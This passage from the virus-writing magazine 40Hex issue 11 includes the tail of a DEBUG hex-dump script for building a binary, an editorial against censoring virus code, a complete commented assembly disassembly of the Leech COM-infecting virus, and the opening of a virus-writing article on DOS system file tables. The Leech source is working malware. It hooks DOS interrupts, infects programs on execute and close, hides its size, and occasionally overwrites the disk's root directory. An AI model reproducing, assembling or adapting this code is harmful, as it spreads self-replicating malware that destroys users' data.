+e 0430  16 FB 09 A1 FD 09 81 C1 A1 09 03 C1 83 D2 00 B9 
+e 0440  00 02 F7 F1 0B D2 74 01 40 A3 FD 09 89 16 FB 09 
+e 0450  FF D7 59 5B B4 40 BA 91 0A E8 C7 FE B4 40 B9 A1 
+e 0460  09 BA 11 0C E8 BC FE B8 00 42 33 C9 99 CD 21 B4 
+e 0470  40 B9 18 00 BA F9 09 E8 A9 FE E9 AD FE 52 51 53 
+e 0480  B4 2C CD 21 E4 40 8A E0 E4 40 33 C1 33 D0 EB 1C 
+e 0490  52 51 53 E4 40 05 00 00 BA 00 00 B9 07 00 D1 E0 
+e 04A0  D1 D2 8A D8 32 DE 79 02 FE C0 E2 F2 A3 96 03 89 
+e 04B0  16 99 03 8A C2 5B 59 5A C3 87 00 86 84 85 03 07 
+e 04C0  0F 1F 5F 5E 5A 59 5B 58 FC 50 53 51 52 56 57 E8 
+e 04D0  07 00 5F 5E 5A 5B 5B 58 C3 FC 50 B8 A7 09 97 AB 
+e 04E0  96 AB AB 92 AB 93 AB 87 CA E8 44 02 B9 1A 00 F3 
+e 04F0  AB E8 9C FF 25 FC FF 59 33 C8 E8 75 02 83 E3 03 
+e 0500  8A 87 BE 03 98 03 D0 F7 D0 23 D0 8B C2 AB D1 E8 
+e 0510  F6 C5 40 74 02 D1 E8 F6 C5 10 75 02 F7 D8 AB 92 
+e 0520  F6 C5 20 75 02 F7 D8 AB E8 65 FF AB B8 84 84 AA 
+e 0530  57 AB AA 5F E8 33 02 78 0B E8 00 02 AA E8 50 FF 
+e 0540  A3 F1 09 4F 47 EB 03 E8 07 02 E8 EF 01 3C 03 72 
+e 0550  F6 AA E8 15 02 78 04 E8 E2 01 AA E8 D2 01 8B 3E 
+e 0560  A9 09 E8 16 02 BE F5 09 56 E8 06 02 83 E3 03 8A 
+e 0570  00 98 A8 80 75 F3 80 8F F5 09 80 8B F0 FE 84 B1 
+e 0580  09 03 DB 8B 97 ED 09 C6 06 A1 09 00 E8 6F 02 E8 
+e 0590  E9 01 E8 06 01 51 80 E1 FC E8 AC 02 59 89 3E A7 
+e 05A0  09 5E BA 04 00 AC A8 80 74 B4 4A 75 F8 BE A7 09 
+e 05B0  BF A3 09 A5 A5 C6 06 A2 09 00 E8 65 00 F6 C5 40 
+e 05C0  74 08 C6 06 A2 09 02 E8 58 00 BB A3 09 51 80 E1 
+e 05D0  FC E8 58 00 59 B8 FC C3 AB BE BB 09 8B 3E AD 09 
+e 05E0  51 E8 19 00 59 BB A5 09 E8 41 00 E8 8A 01 89 3E 
+e 05F0  A9 09 BE CD 09 2B 3E AB 09 03 3E AF 09 F6 C5 20 
+e 0600  74 04 03 3E ED 09 2B 3E F1 09 8B 4C FE E3 08 97 
+e 0610  97 AD 97 01 05 E2 F9 8B 3E A9 09 8B CF 2B 0E AB 
+e 0620  09 C3 E8 84 00 E8 DA 00 E8 7E 00 C3 8B 7F 04 53 
+e 0630  C6 06 A1 09 00 A0 F7 09 25 07 00 BA 02 00 F6 C5 
+e 0640  40 74 02 D1 E2 F6 C5 20 74 02 F7 DA E8 F9 02 B2 
+e 0650  75 A0 F6 09 25 07 00 3C 04 74 26 52 BA 01 00 F6 
+e 0660  C5 10 74 19 3C 01 75 13 E8 FF 00 78 0E 5A E8 01 
+e 0670  01 87 DA 80 E2 02 80 CA E0 EB 06 F7 DA E8 C8 02 
+e 0680  5A 5B 8B 07 2B C7 48 48 86 E0 8A C2 F6 C4 80 75 
+e 0690  05 58 58 E9 2C FE AB 89 7F 04 C3 C6 06 A1 09 0A 
+e 06A0  89 3E A9 09 8B 3E A7 09 C3 8B 3E A9 09 E8 CB 00 
+e 06B0  A0 F8 09 25 07 00 3C 04 74 E1 E8 B5 00 80 FB C0 
+e 06C0  77 D9 E8 13 00 E8 DB 00 E8 D0 FF 51 80 E1 FC FF 
+e 06D0  50 01 59 89 3E A7 09 C3 C6 06 A1 09 00 E8 8A 00 
+e 06E0  78 08 E8 8D 00 BE 07 09 EB 15 E8 85 00 83 E3 07 
+e 06F0  80 FB 04 74 F5 80 BF B1 09 00 74 EE BE 3A 09 87 
+e 0700  D3 C3 8B 3E A9 09 E8 72 00 A0 F7 09 25 07 00 BB 
+e 0710  B6 03 D7 BD CB 09 E8 BF FF E8 0B 00 E8 84 00 BD 
+e 0720  B9 09 E8 02 00 EB A1 50 AC 98 03 F0 58 46 46 C3 
+e 0730  33 C0 BF B1 09 AB AB 40 AB 48 AB C3 E8 51 FD 25 
+e 0740  07 00 8B F0 80 BC B1 09 00 75 F1 FE 84 B1 09 C3 
+e 0750  92 8B F0 C6 84 B1 09 00 C3 50 51 57 BF B1 09 B9 
+e 0760  08 00 33 C0 F2 AE 5F 59 58 C3 50 E8 22 FD 0B C0 
+e 0770  58 C3 93 E8 1A FD 93 C3 E8 00 00 C6 06 A1 09 00 
+e 0780  E8 00 00 E8 D3 FF 75 EF F6 C1 02 74 EA 50 52 E8 
+e 0790  FE FC 92 E8 A6 FF E8 B8 FF BE EE 08 EB 07 56 E8 
+e 07A0  E1 FF 5E 50 52 56 51 91 AC 98 91 E8 C4 FF 23 D9 
+e 07B0  59 FE 06 A1 09 80 3E A1 09 0A 72 02 33 DB 53 FF 
+e 07C0  10 5B 5E 5A 58 C3 BE 3A 09 83 E2 07 EB D5 BE 07 
+e 07D0  09 EB D0 92 24 07 BB FF 08 D7 AA C3 92 25 0F 00 
+e 07E0  0C 70 AB C3 0A C0 78 04 04 50 AA C3 05 30 FF EB 
+e 07F0  0A 0A C0 78 04 04 58 AA C3 B4 8F E9 F0 00 BE 55 
+e 0800  09 EB 9B E8 6C FF 53 2B D3 E8 F2 FF 5A EB 23 3C 
+e 0810  04 73 35 50 52 E8 38 00 5A 58 86 F2 EB 30 E8 51 
+e 0820  FF 53 33 D3 E8 D7 FF 5A E9 96 00 52 8B D0 E8 9B 
+e 0830  00 5A E9 13 01 D1 CA E8 C4 FF EB 07 D1 C2 E8 BD 
+e 0840  FF 0C 08 B4 D1 E9 A6 00 04 B8 AA 92 AB C3 04 04 
+e 0850  04 B0 8A E2 AB C3 BE 66 09 EB A6 50 92 E8 84 FF 
+e 0860  58 EB 8E B4 8B EB 6D E8 00 FF 78 EA BE 6F 09 E9 
+e 0870  2C FF 52 50 52 E8 6C FF 58 E8 68 FF 58 E8 71 FF 
+e 0880  58 E9 6D FF E8 D2 FE 75 14 52 50 E8 AE FE E8 D6 
+e 0890  FF 5A E8 D7 FF 5A 92 E8 CD FF E9 B3 FE 0A C0 78 
+e 08A0  0A 3A C2 7F 02 86 C2 0A D2 74 06 86 C2 B4 87 EB 
+e 08B0  35 04 90 AA C3 E8 BA FE 53 33 D3 E8 03 00 5A EB 
+e 08C0  00 BE 78 09 E9 D7 FE 0C 30 E9 8B 00 BE 81 09 E9 
+e 08D0  CC FE B4 33 0A C0 78 09 0A D2 78 0A E8 8B FE 78 
+e 08E0  05 86 C2 80 EC 02 D0 E0 D0 E0 D0 E0 0A C2 0A C0 
+e 08F0  78 02 0C C0 86 E0 F6 C4 40 75 1D F6 C1 01 75 05 
+e 0900  50 B0 2E AA 58 AB 2E 8B 76 00 03 F6 2E 89 7A 02 
+e 0910  2E FF 46 00 A0 A2 09 98 AB C3 BE 86 09 E9 7E FE 
+e 0920  B4 03 EB B0 BE 8B 09 E9 74 FE B4 2B EB A6 E8 50 
+e 0930  00 4A EB 14 E8 45 00 42 EB 0E E8 35 FE 53 2B D3 
+e 0940  E8 05 00 5A EB 02 F7 DA 0B D2 75 01 C3 BE 90 09 
+e 0950  E9 4B FE 0A C0 74 0E 0A C0 78 02 04 C0 B4 81 E8 
+e 0960  8C FF 92 AB C3 B0 05 AA EB F8 F7 DA 0B D2 74 DC 
+e 0970  0A C0 74 04 04 28 EB DF B0 2D EB EB 50 04 08 EB 
+e 0980  01 50 0A C0 79 07 B4 FF E8 63 FF 58 C3 04 40 AA 
+e 0990  58 C3 BB 56 07 BE 67 07 EB 0F BB D2 07 EB 08 BB 
+e 09A0  20 08 EB 03 BB 2A 08 8B F3 E8 AD FD 75 2E 50 56 
+e 09B0  E8 89 FD E8 A0 FE 5E 5A 92 52 FF D6 5A E9 90 FD 
+e 09C0  BB C1 07 BE CC 07 E8 90 FD 75 11 50 56 E8 6C FD 
+e 09D0  E8 2B FE 92 5E 58 52 FF D6 5A EB E1 FF E3 BB 48 
+e 09E0  08 BE 1A 08 EB E0 BB FE 06 BE 67 07 EB D8 0E 77 
+e 09F0  06 77 06 C6 06 C6 06 CE 06 CE 06 D3 06 DC 06 F8 
+e 0A00  F5 F9 FC FD FB CC F0 0E C1 07 FE 06 6C 08 48 08 
+e 0A10  7C 08 81 08 41 07 43 07 0E C1 07 6C 08 48 08 48 
+e 0A20  08 7C 08 81 08 41 07 43 07 0E C1 07 48 08 6C 08 
+e 0A30  6C 08 81 08 7C 08 43 07 41 07 06 CC 07 56 07 24 
+e 0A40  08 1A 08 06 CC 07 CC 07 24 08 1A 08 06 CC 07 CC 
+e 0A50  07 1A 08 24 08 0E 48 07 E6 08 03 07 0F 07 1E 07 
+e 0A60  2B 07 35 07 3C 07 06 63 07 63 07 92 08 5B 07 06 
+e 0A70  9D 07 9D 07 72 07 84 07 06 C7 07 C7 07 C0 08 B5 
+e 0A80  07 02 D2 07 9A 08 02 20 08 9F 08 02 2A 08 A4 08 
+e 0A90  0E 53 08 53 08 DE 08 6A 08 2E 08 34 08 3A 08 3A 
+e 0AA0  08 
+rcx
+09A1
+w
+q
+-end trigger.scr---------------------------------------------------------------
+
+40Hex Issue 11 Volume 3 Number 2                                      File 004
+
+                         40-Hex Editorial
+
+                         Virus Censorship
+                           by DecimatoR
+
+    Recently in the comp.virus echo of Usenet there was a discussion
+entitled "40 Hex Censorship".  A few people were complaining about this 
+magazine being censored by the anti-virus community, and on Internet 
+itself.  I found this thread interesting, and figured I'd voice my opinions 
+on it here, where it counts.  
+
+    As many of you know, 40-Hex is one of the most popular underground mags.  
+I was actually told by a European Anti-Virus researcher that 40-Hex was 
+regarded as the best VX magazine in existance by most of the anti-virus
+community.  Of course, I was quite happy to hear this.  (Who wouldn't be?) 
+But I also couldn't help wondering, how could a magazine like 40-Hex, with no 
+real distribution system, be the most popular?  It got me thinking, and I 
+realized that we provide, in great detail, some of the most recent news, and 
+developments in the virus community.  Anyone can publish source code and
+hex dumps, but we take it a bit further.  40-Hex is more than just a how-to 
+magazine, it's a publication which delves into details, world wide 
+developments, and never-before distributed source code with new and
+interesting programming techniques.  It's more than a source of viruses; it's 
+a source of _information_.
+
+    This also got me thinking, about the actual distribution system of 
+40-Hex.  Each issue is distributed on two, and ONLY two bulletin boards - 
+Digital Warfare and Liquid Euphoria.  From there, it is passed rapidly across 
+the country, and, soon after, around the world.  Unfortunately, 40-Hex never 
+seems to make it to a LARGE portion of the population who want it - the folks 
+who hang out on in the comp.virus echo of Usenet.  A few issues back, I 
+posted a note there, asking for input on a survey I was conducting.  Over 
+half of the replies I received didn't even answer my questions - all the
+folks wanted to know was WHERE could they get their hands on 40-Hex?  After a 
+little digging, I found 2 sites which allowed 40-Hex to be posted for 
+anonymous FTP.  Within a month, both sites had removed the magazine.  
+Censorship?  You bet.  See, the anti-virus folks on Usenet feel that this 
+magazine is BAD.  After all, we publish source code which any virus author 
+can learn by.  We encourage people to learn new programming techniques.  We 
+tell the truth about how viruses work, and we're not afraid to give people 
+code which shows HOW viruses do what they do, so that anyone who wishes to 
+write a virus has the KNOWLEDGE to do so.  
+
+    But does this make us bad?  Let's look at it again, in a slightly 
+different perspective:
+
+We publish source code which any anti-virus author can learn by.  We encourage
+people to learn new programming techniques.  We tell the truth about how
+viruses work, and we're not afraid to give people code which shows HOW viruses
+do what they do, so that anyone who wishes to write anti-virus software has the
+KNOWLEDGE to do so.  
+
+Hmmm...  now do we seem so bad?  With the addition of a few "anti"s in that 
+last paragraph, we turned 40-Hex around - from a bad underground magazine to 
+a beneficial wealth of information.  Interesting, eh?
+
+This seems to be where the Vesselin Bontchev's of the world have a serious 
+problem seeing the forest, because of the trees.  Bontchev has often 
+proclaimed, quite loudly, and in no uncertain terms, that virus code should 
+NEVER, NEVER, NEVER, UNDER _ANY_ CIRCUMSTANCES, BE DISTRIBUTED TO ANYONE! 
+Anyone, that is, except an anti-virus researcher like himself. 
+Double standard?  Yes. 
+
+A typical scenario on the newsgroup reads like this:
+
+Joe Unknown:  Hi, I'm interested in writing an anti-virus package, and need
+              to obtain viruses which I can experiment and work with.  Where
+              can I find them?
+
+Joe Established-AV-Person: You can't.  I don't know you, and no one else does 
+                           either.  Therefore, you cannot be trusted, and you 
+                           may not recieve virus code.  You should be ashamed
+                           for asking!  You probably just want to learn to
+                           write viruses so you can wreak havoc on all 
+                           computers everywhere!  Hmmmph!
+
+    Yes, folks, it IS this bad.  The anti-virus guys talk of "ethical 
+standards" which say that they just can't give out virus code, except to 
+other established AV people.  Ethical standards?  DOUBLE STANDARDS!!!  What 
+would happen, if they DID give their viruses to "unknown" people who wanted 
+them?  Would massive virus infections result?  Maybe.  Would new anti-virus 
+software packages be created?  Probably.  But will the AV guys give anyone a 
+chance?  Hardly.
+
+    It's this attitude which upsets a lot of people.  And one of them was 
+upset enough to finally ask WHY 40-Hex was so censored on the net.  Of course,
+he got the "ethical standard" reply.  But the true fact is - people WANT this 
+(and any other) fine VX magazine!  The Nuke Infojournals, ARCV newsletters, 
+the Crypt newsletters...  I've had people ask me time and time again WHERE 
+they can find them on the Internet.  And I've told them, time and time again, 
+"You can't.  Sorry."  
+
+    Most of you who read this mag are involved in either of 3 groups:
+The Virus underground, System Security, or Anti-Virus research.  Where did 
+YOU obtain your copy of 40-Hex?  A BBS?  A friend?  A disk you found lying in 
+the computer room?  Probably a BBS.  Certainly not Internet.  The poor folks 
+on Internet are missing out on a LOT of good information, all because a 
+handful of self-appointed experts decided that CENSORSHIP was better than 
+KNOWLEDGE.  Of course, if I were to post this fact in comp.virus, my message 
+would never get out.  Why?  Because the group is moderated by an individual 
+who ranks right up there with the rest of the Censors.  Any message even 
+vaguely requesting a source for viruses is killed before it gets out.  And 
+certainly, any post containing source code, or a way to obtain viruses is 
+nuked before it's ever seen by anyone.  THE COMP.VIRUS ECHO IS ONE OF THE 
+MOST HEAVILY CENSORED NEWSGROUPS ON USENET!  Does this bother you?  It 
+certainly bothers me!  INFORMATION IS POWER, FOLKS!  Stupidity is NOT!
+
+    Recently I had a long conversation with Alan Solomon, head of S & S 
+International, publisher of Dr. Solomon's Anti-Virus Toolkit.  It was a 
+pleasant conversation, and Dr. Solly is a very nice person to talk to.  
+Although we obviously don't see eye-to-eye on certain topics, we came to a 
+general understanding - he does anti-virus work to help other people and to
+make a living.  I run a virus board to pass on information and to fight
+censorship.  I respect him for his ideals, and I believe he respects me 
+for mine.  Of course, he doesn't approve of what I do, but he respects my 
+reasons for doing it.  Was an interesting conversation, I'm glad we had it.  
+Thanks, Alan - for everything.
+
+    Censorship of viruses, virus code, and virus mags is quite strong.  Those 
+in the underground often don't realize how censored this material really is, 
+or how lucky they are to be able to obtain it with a phone call.  It really 
+bugs me to think that people out there WANT the information contained inside 
+this very issue, but are unable to get it because of the closed minds of a 
+handful of "experts".
+
+    Wake up people!  This is the 90's!  This is the INFORMATION AGE!  
+Censorship doesn't HELP!  It HARMS!  Keeping people ignorant doesn't help 
+them, it HURTS them!  Knowledge is power!  FREE INFORMATION IS WHAT CYBERSPACE
+IS BASED ON!  Anything else is simply _wrong_.
+
+          --Dec
+
+40Hex Issue 11 Volume 3 Number 2                                      File 005
+
+                          Virus Spotlight on: Leech
+
+     This month's virus is a Bulgarian creation known as Leech.  It is mildly
+polymorphic, implementing a simple code swapping algorithm.  It infects on
+file executes and file closes.  The infections upon file closes is especially
+noteworthy; look closely at the manipulation of the system file table (and see
+the related article in this issue of 40Hex for more details).  This resident,
+COM-specific infector also hides file length increases, although the stupid
+CHKDSK error will occur.
+
+                                               -- Dark Angel
+                                                  Phalcon/Skism
+-------------------------------------------------------------------------------
+                .model  tiny
+                .code
+                org     0
+; Leech virus
+; Disassembly by Dark Angel of Phalcon/Skism
+; Assemble with Tasm /m Leech.asm
+
+virlength       =       (readbuffer - leech)
+reslength       =       (((encrypted_file - leech + 15) / 16) + 2)
+
+leech:
+                jmp     short enter_leech
+
+filesize        dw      offset carrier
+oldint21        dw      0, 0
+oldint13        dw      0, 0
+oldint24        dw      0, 0
+datestore       dw      0
+timestore       dw      0
+runningflag     db      1
+evenodd         dw      0
+
+enter_leech:
+                call    next
+next:
+                pop     si
+mutatearea1:
+                cli
+                push    ds                      ; Why?
+                pop     es
+                mov     bp,sp                   ; save sp
+                mov     sp,si                   ; sp = offset next
+                add     sp,encrypt_value1 - 1 - next
+mutatearea2:
+                mov     cx,ss                   ; save ss
+                mov     ax,cs
+                mov     ss,ax                   ; ss = PSP
+                pop     bx                      ; get encryption value
+                dec     sp
+                dec     sp
+                add     si,startencrypt - next
+                nop
+decrypt:
+mutatearea3:
+                pop     ax
+                xor     al,bh                   ; decrypt away!
+                push    ax
+                dec     sp
+                cmp     sp,si
+                jae     decrypt
+startencrypt:
+                mov     ax,es
+                dec     ax
+                mov     ds,ax                   ; ds->MCB
+                db      81h,6,3,0               ;add word ptr ds:[3],-reslength
+                dw      0 - reslength
+                mov     bx,ds:[3]               ; bx = memory size
+                mov     byte ptr ds:[0],'Z'     ; mark end of chain
+                inc     ax                      ; ax->PSP
+                inc     bx
+                add     bx,ax                   ; bx->high area
+                mov     es,bx                   ; as does es
+                mov     ss,cx                   ; restore ss
+                add     si,leech - startencrypt
+                mov     bx,ds                   ; save MCB segment
+                mov     ds,ax
+                mov     sp,bp                   ; restore sp
+                push    si
+                xor     di,di
+                mov     cx,virlength            ; 1024 bytes
+                cld
+                rep     movsb
+                pop     si
+                push    bx
+                mov     bx,offset highentry
+                push    es
+                push    bx
+                retf                            ; jmp to highentry in
+                                                ; high memory
+highentry:
+                mov     es,ax                   ; es->PSP
+                mov     ax,cs:filesize
+                add     ax,100h                 ; find stored area
+                mov     di,si
+                mov     si,ax
+                mov     cx,virlength
+                rep     movsb                   ; and restore over virus code
+                pop     es                      ; MCB
+                xor     ax,ax
+                mov     ds,ax                   ; ds->interrupt table
+                sti
+                cmp     word ptr ds:21h*4,offset int21 ; already resident?
+                jne     go_resident
+                db      26h,81h,2eh,3,0         ;sub word ptr es:[3],-reslength
+                dw      0 - reslength           ; alter memory size
+                test    byte ptr ds:[46Ch],0E7h ; 1.17% chance of activation
+                jnz     exit_virus
+                push    cs
+                pop     ds
+                mov     si,offset message
+display_loop:                                   ; display ASCIIZ string
+                lodsb                           ; get next character
+                or      al,0                    ; exit if 0
+                jz      exit_display_loop
+                mov     ah,0Eh                  ; otherwise write character
+                int     10h
+
+                jmp     short display_loop
+exit_display_loop:
+                mov     ah,32h                  ; Get DPB -> DS:BX
+                xor     dl,dl
+                int     21h
+                jc      exit_virus              ; exit on error
+
+                call    getint13and24
+                call    setint13and24
+                mov     dx,[bx+10h]             ; first sector of root
+                                                ; directory
+                                                ; BUG: won't work in DOS 4+
+                mov     ah,19h                  ; default drive -> al
+                int     21h
+
+                mov     cx,2                    ; overwrite root directory
+                int     26h
+
+                pop     bx
+                call    setint13and24           ; restore int handlers
+exit_virus:
+                jmp     returnCOM
+go_resident:
+                db      26h, 81h, 6, 12h, 0     ;add word ptr es:12h,-reslength
+                dw      0 - reslength           ; alter top of memory in PSP
+                mov     bx,ds:46Ch              ; BX = random #
+                push    ds
+                push    cs
+                pop     ds
+                push    cs
+                pop     es
+                mov     runningflag,1           ; reset flag
+                and     bh,80h
+                mov     nothing1,bh
+mutate1:
+                test    bl,1
+                jnz     mutate2
+                mov     si,offset mutatearea1
+                add     si,evenodd
+                lodsb
+                xchg    al,[si]                 ; swap instructions
+                mov     [si-1],al
+mutate2:
+                test    bl,2
+                jnz     mutate3
+                mov     si,offset mutatearea2
+                add     si,evenodd
+                lodsw
+                xchg    ax,[si]                 ; swap instructions
+                mov     [si-2],ax
+mutate3:
+                test    bl,4
+                jnz     mutate4
+                mov     si,offset mutatearea3
+                mov     al,2
+                xor     [si],al                 ; flip between ax & dx
+                xor     [si+2],al
+                xor     [si+3],al
+mutate4:
+                test    bl,8
+                jnz     findint21
+                mov     si,offset next
+                mov     di,offset readbuffer
+                mov     cx,offset enter_leech
+                push    si
+                push    di
+                lodsb
+                cmp     al,5Eh                  ; 1 byte pop si?
+                je      now_single_byte_encode
+                inc     si                      ; skip second byte of two
+                                                ; byte encoding of pop si
+now_single_byte_encode:
+                push    cx
+                rep     movsb
+                pop     cx
+                pop     si
+                pop     di
+                cmp     al,5Eh                  ; 1 byte pop si?
+                je      encode_two_bytes        ; then change to 2
+                mov     al,5Eh                  ; encode a pop si
+                stosb
+                rep     movsb                   ; then copy decrypt over
+                mov     al,90h                  ; plus a nop to keep virus
+                stosb                           ; length constant
+                xor     ax,ax                   ; clear the flag
+                jmp     short set_evenodd_flag
+encode_two_bytes:
+                mov     ax,0C68Fh               ; encode a two byte form of
+                stosw                           ; pop si
+                rep     movsb
+                mov     ax,1                    ; set evenodd flag
+set_evenodd_flag:
+                mov     cs:evenodd,ax
+findint21:
+                mov     ah,30h                  ; Get DOS version
+                int     21h
+
+                cmp     ax,1E03h                ; DOS 3.30?
+                jne     notDOS33
+
+                mov     ah,34h                  ; Get DOS critical error ptr
+                int     21h
+
+                mov     bx,1460h                ; int 21h starts here
+                jmp     short alterint21
+notDOS33:
+                mov     ax,3521h                ; just get current int 21 handler
+                int     21h
+alterint21:
+                mov     oldint21,bx
+                mov     word ptr ds:oldint21+2,es
+                mov     si,21h*4                ; save old int 21 handler
+                pop     ds                      ; found in interrupt table
+                push    si
+                push    cs
+                pop     es
+                mov     di,offset topint21
+                movsw
+                movsw
+                pop     di                      ; and put new one in
+                push    ds
+                pop     es
+                mov     ax,offset int21
+                stosw
+                mov     ax,cs
+                stosw
+
+                mov     di,offset startencrypt
+                mov     al,cs:encrypt_value1     ; decrypt original program code
+decryptcode:
+                xor     cs:[di],al
+                inc     di
+                cmp     di,offset decryptcode
+                jb      decryptcode
+returnCOM:
+                mov     ah,62h                  ; Get current PSP
+                int     21h
+
+                push    bx                      ; restore segment registers
+                mov     ds,bx
+                mov     es,bx
+                mov     ax,100h
+                push    ax
+                retf                            ; Return to PSP:100h
+
+infect:
+                push    si
+                push    ds
+                push    es
+                push    di
+                cld
+                push    cs
+                pop     ds
+                xor     dx,dx                   ; go to start of file
+                call    movefilepointer
+                mov     dx,offset readbuffer    ; and read 3 bytes
+                mov     ah,3Fh
+                mov     cx,3
+                call    callint21
+                jc      exiterror
+
+                xor     di,di
+                mov     ax,readbuffer
+                mov     cx,word ptr ds:[0]
+                cmp     cx,ax                   ; check if already infected
+                je      go_exitinfect
+                cmp     al,0EBh                 ; jmp short?
+                jne     checkifJMP
+                mov     al,ah
+                xor     ah,ah
+                add     ax,2
+                mov     di,ax                   ; di = jmp location
+checkifJMP:
+                cmp     al,0E9h                 ; jmp?
+                jne     checkifEXE              ; nope
+                mov     ax,word ptr readbuffer+1
+                add     ax,3
+                mov     di,ax                   ; di = jmp location
+                xor     ax,ax
+checkifEXE:
+                cmp     ax,'MZ'
+                je      exiterror
+                cmp     ax,'ZM'
+                jne     continue_infect
+exiterror:
+                stc
+go_exitinfect:
+                jmp     short exitinfect
+                nop
+continue_infect:
+                mov     dx,di
+                push    cx
+                call    movefilepointer         ; go to jmp location
+                mov     dx,virlength            ; and read 1024 more bytes
+                mov     ah,3Fh
+                mov     cx,dx
+                call    callint21
+                pop     cx
+                jc      exiterror
+                cmp     readbuffer,cx
+                je      go_exitinfect
+                mov     ax,di
+                sub     ah,0FCh
+                cmp     ax,filesize
+                jae     exiterror
+                mov     dx,filesize
+                call    movefilepointer
+                mov     dx,virlength            ; write virus to middle
+                mov     cx,dx                   ; of file
+                mov     ah,40h
+                call    callint21
+                jc      exitinfect
+                mov     dx,di
+                call    movefilepointer
+                push    cs
+                pop     es
+                mov     di,offset readbuffer
+                push    di
+                push    di
+                xor     si,si
+                mov     cx,di
+                rep     movsb
+                mov     si,offset encrypt_value2
+                mov     al,encrypted_file
+encryptfile:                                    ; encrypt infected file
+                xor     [si],al
+                inc     si
+                cmp     si,7FFh
+                jb      encryptfile
+                pop     cx
+                pop     dx
+                mov     ah,40h                  ; and write it to end of file
+                call    callint21
+exitinfect:
+                pop     di
+                pop     es
+                pop     ds
+                pop     si
+                retn
+
+int21:
+                cmp     ax,4B00h                ; Execute?
+                je      execute
+                cmp     ah,3Eh                  ; Close?
+                je      handleclose
+                cmp     ah,11h                  ; Find first?
+                je      findfirstnext
+                cmp     ah,12h                  ; Find next?
+                je      findfirstnext
+exitint21:
+                db      0EAh                    ; jmp far ptr
+topint21        dw      0, 0
+
+findfirstnext:
+                push    si
+                mov     si,offset topint21
+                pushf
+                call    dword ptr cs:[si]       ; call int 21 handler
+                pop     si
+                push    ax
+                push    bx
+                push    es
+                mov     ah,2Fh                  ; Get DTA
+                call    callint21
+                cmp     byte ptr es:[bx],0FFh   ; extended FCB?
+                jne     noextendedFCB
+                add     bx,7                    ; convert to normal
+noextendedFCB:
+                mov     ax,es:[bx+17h]          ; Get time
+                and     ax,1Fh                  ; and check infection stamp
+                cmp     ax,1Eh
+                jne     exitfindfirstnext
+                mov     ax,es:[bx+1Dh]
+                cmp     ax,virlength * 2 + 1    ; too small for infection?
+                jb      exitfindfirstnext       ; then not infected
+                sub     ax,virlength            ; alter file size
+                mov     es:[bx+1Dh],ax
+exitfindfirstnext:
+                pop     es
+                pop     bx
+                pop     ax
+                iret
+
+int24:
+                mov     al,3
+                iret
+
+callint21:
+                pushf
+                call    dword ptr cs:oldint21
+                retn
+
+movefilepointer:
+                xor     cx,cx
+                mov     ax,4200h
+                call    callint21
+                retn
+
+execute:
+                push    ax
+                push    bx
+                mov     cs:runningflag,0
+                mov     ax,3D00h                ; open file read/only
+                call    callint21
+                mov     bx,ax
+                mov     ah,3Eh                  ; close file
+                int     21h                     ; to trigger infection
+
+                pop     bx
+                pop     ax
+go_exitint21:
+                jmp     short exitint21
+
+handleclose:
+                or      cs:runningflag,0        ; virus currently active?
+                jnz     go_exitint21
+                push    cx
+                push    dx
+                push    di
+                push    es
+                push    ax
+                push    bx
+                call    getint13and24
+                call    setint13and24
+; convert handle to filename
+                mov     ax,1220h                ; get job file table entry
+                int     2Fh
+                jc      handleclose_noinfect    ; exit on error
+
+                mov     ax,1216h                ; get address of SFT
+                mov     bl,es:[di]
+                xor     bh,bh
+                int     2Fh                     ; es:di->file entry in SFT
+
+                mov     ax,es:[di+11h]
+                mov     cs:filesize,ax          ; save file size,
+                mov     ax,es:[di+0Dh]
+                and     al,0F8h
+                mov     cs:timestore,ax         ; time,
+                mov     ax,es:[di+0Fh]
+                mov     cs:datestore,ax         ; and date
+                cmp     word ptr es:[di+29h],'MO' ; check for COM extension
+                jne     handleclose_noinfect
+                cmp     byte ptr es:[di+28h],'C'
+                jne     handleclose_noinfect
+                cmp     cs:filesize,0FA00h      ; make sure not too large
+                jae     handleclose_noinfect
+                mov     al,20h                  ; alter file attribute
+                xchg    al,es:[di+4]
+                mov     ah,2                    ; alter open mode to read/write
+                xchg    ah,es:[di+2]
+                pop     bx
+                push    bx
+                push    ax
+                call    infect
+                pop     ax
+                mov     es:[di+4],al            ; restore file attribute
+                mov     es:[di+2],ah            ; and open mode
+                mov     cx,cs:timestore
+                jc      infection_not_successful
+                or      cl,1Fh                  ; make file infected in
+                and     cl,0FEh                 ; seconds field
+infection_not_successful:
+                mov     dx,cs:datestore         ; restore file time/date
+                mov     ax,5701h
+                call    callint21
+handleclose_noinfect:
+                pop     bx
+                pop     ax
+                pop     es
+                pop     di
+                pop     dx
+                pop     cx
+                call    callint21
+                call    setint13and24
+                retf    2                       ; exit with flags intact
+
+getint13and24:
+                mov     ah,13h                  ; Get BIOS int 13h handler
+                int     2Fh
+                mov     cs:oldint13,bx
+                mov     cs:oldint13+2,es
+
+                int     2Fh                     ; Restore it
+
+                mov     cs:oldint24,offset int24
+                mov     cs:oldint24+2,cs
+                retn
+
+setint13and24:
+                push    ax
+                push    si
+                push    ds
+                pushf
+                cli
+                cld
+                xor     ax,ax
+                mov     ds,ax                   ; ds->interrupt table
+
+                mov     si,13h*4
+                lodsw
+                xchg    ax,cs:oldint13          ; replace old int 13 handler
+                mov     [si-2],ax               ; with original BIOS handler
+                lodsw
+                xchg    ax,cs:oldint13+2
+                mov     [si-2],ax
+
+                mov     si,24h*4                ; replace old int 24 handler
+                lodsw                           ; with our own handler
+                xchg    ax,cs:oldint24
+                mov     [si-2],ax
+                lodsw
+                xchg    ax,cs:oldint24+2
+                mov     [si-2],ax
+                popf
+                pop     ds
+                pop     si
+                pop     ax
+                retn
+
+message         db      'The leech live ...', 0
+                db      'April 1991  The Topler.'
+
+                db      0, 0, 0, 0, 0
+
+encrypt_value1  db      0
+readbuffer      dw      0
+                db      253 dup (0)
+
+nothing1        db      0
+                db      152 dup (0)
+encrypt_value2  db      0
+                db      614 dup (0)
+encrypted_file  db      0
+                db      1280 dup (0)
+carrier:
+                dw      20CDh
+
+                end     leech
+-------------------------------------------------------------------------------
+
+
+40Hex Issue 11 Volume 3 Number 2                                      File 006
+
+                             ýýýýýýýýýýýýýýýýýýýýý
+                             SFT's and Their Usage
+                             ýýýýýýýýýýýýýýýýýýýýý
+                                 By Dark Angel
+                                 Phalcon/Skism
+                             ýýýýýýýýýýýýýýýýýýýýý
+
+       A powerful though seldom-used technique in virus writing is the use of
+  the system file table, an internal DOS structure similar in some respects to
+  FCBs, albeit vastly more powerful.  The system file table holds the critical
+  information on the state of an open file, including the current pointer
